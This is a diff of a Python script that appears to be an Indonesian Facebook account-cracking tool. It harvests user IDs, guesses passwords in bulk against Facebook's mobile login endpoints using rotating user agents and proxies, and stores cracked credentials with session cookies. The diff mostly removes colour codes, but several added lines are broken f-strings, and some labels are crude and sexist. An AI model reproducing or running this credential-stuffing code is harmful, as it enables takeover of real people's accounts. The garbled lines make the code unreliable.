@@ -174,7 +174,7 @@ def menu(my_name,my_id):
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
-		print('[×] Cookies Kadaluarsa ')
+		print(' Cookies Kadaluarsa ')
 		time.sleep(5)
 		login_lagi334()
 	os.system('clear')
@@ -433,7 +433,7 @@ def grup():
 def grup1(urls):
 	use = []
 	ses = requests.Session()
-	print(f'{x}>> Sedang Mengumpulkan ID ')
+	print(f'>> Sedang Mengumpulkan ID ')
 	print(f'>> Klik Ctrl+C Untuk Stop Dump !!')
 	while True:
 		try:
@@ -508,11 +508,11 @@ def crack_file():
 		if kontol in ['']:
 			print('>> Pilih Yang Bener ')
 		elif kontol in ['y','Y']:
-			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintar ')
+			print(f' Alhamdulillah Anda Sungguh Pintar ')
 			time.sleep(3)
 			back()
 		elif kontol in ['t','T']:
-			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
+			print(f' Anda Sungguh Tolol ')
 			time.sleep(3)
 			exit()
 		print('>> Anda Tidak Memiliki File Dump ')
@@ -529,15 +529,15 @@ def crack_file():
 				nom = ''+str(cih)
 				lol.update({str(cih):str(isi)})
 				lol.update({nom:str(isi)})
-				print(f'%s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
+				print(f'%s. %s ( %s idz )'%(nom,isi,len(hem)))
 			else:
 				lol.update({str(cih):str(isi)})
 				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-				print('%s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
+				print('%s. %s ( %s idz) '%(cih,isi,len(hem)))
 		geeh = input('\n>> Pilih : ')
 		try:geh = lol[geeh]
 		except KeyError:
-			print(f'{k}>> Pilih Yang Bener Dong!! {x}')
+			print(f'>> Pilih Yang Bener Dong!! ')
 			time.sleep(3)
 			back()
 		try:lin = open('ALVINO-DUMP/'+geh,'r').read().splitlines()
@@ -550,7 +550,7 @@ def crack_file():
 		setting()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-	print(f'{x} 1. Akun Janda ')
+	print(f' 1. Akun Janda ')
 	print(' 2. Akun Perawan ')
 	print(' 3. Akun Janda Rasa Perawan ')
 	hu = input('>> Pilih : ')
@@ -615,11 +615,11 @@ def setting():
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menggoyang Janda{m}•{k}•{h}•{x} <<<<< ')
+	print(f'>>>>>  Sedang Menggoyang Janda <<<<< ')
 	print('')
-	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'>> Mainkan Mode Pesawat Setiap {m}1000{x} ID\n')
+	print(f'>> Hasil OK Tersimpan Di : OK/%s '%(okc))
+	print(f'>> Hasil CP Tersimpan Di : CP/%s '%(cpc))
+	print(f'>> Mainkan Mode Pesawat Setiap 1000 ID\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -656,22 +656,22 @@ def passwrd():
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
 	cetak(nel('\t[cyan]✓[green] Crack Selesai, Jangan Lupa Sedekah[cyan] ✓[white] '))
-	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
-	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
+	print(f' OK : {h}%s '%(ok))
+	print(f' CP : {k}%s{x} '%(cp))
 	print('')
 	print('>> Lanjut Crack Lagi ( Y/t ) ? ')
 	woi = input('>> Pilih : ')
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\t{x}>>{k} Good Bye{x} << ')
+		print(f' Good Bye << ')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE-B-API ]-----------------#
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -688,7 +688,7 @@ def crack(idf,pwv):
 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{x}{k} {idf}|{pw}{N}')     
+				print(f' {idf}|{pw')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -699,7 +699,7 @@ def crack(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print(f'\r{x}{H}{idf}|{pw}|{kuki}{N}')
+					print(f'{idf}|{pw}|{kuki}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					break
 				elif 'ya' in taplikasi:
@@ -714,7 +714,7 @@ def crack(idf,pwv):
 					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
 					nok=1
 					for muncul in apkaktif:
-						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
+						infoakun+= (f" {nok}] {muncul[0]} {muncul[1]}{x}\n")
 						nok+=1
 
 					hit=0
@@ -722,8 +722,8 @@ def crack(idf,pwv):
 					hit=0
 					for muncul in apkexp:
 						hit+=1
-						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
-					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
+						infoakun += (f"	{{hit}] {muncul[0]} {muncul[1]}\n")
+					print(f'{idf}|{pw}|{kuki}\n{infoakun}')
 					ok+=1
 					break
 
@@ -821,7 +821,7 @@ def cracktouch(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s [API] %s/%s 👽 [OK/%s] | [CP/%s] 👽 %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s [API] %s/%s [OK/%s] | [CP/%s] %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen).replace('\n','')
 	ses = requests.Session()
 	for pw in pwv:
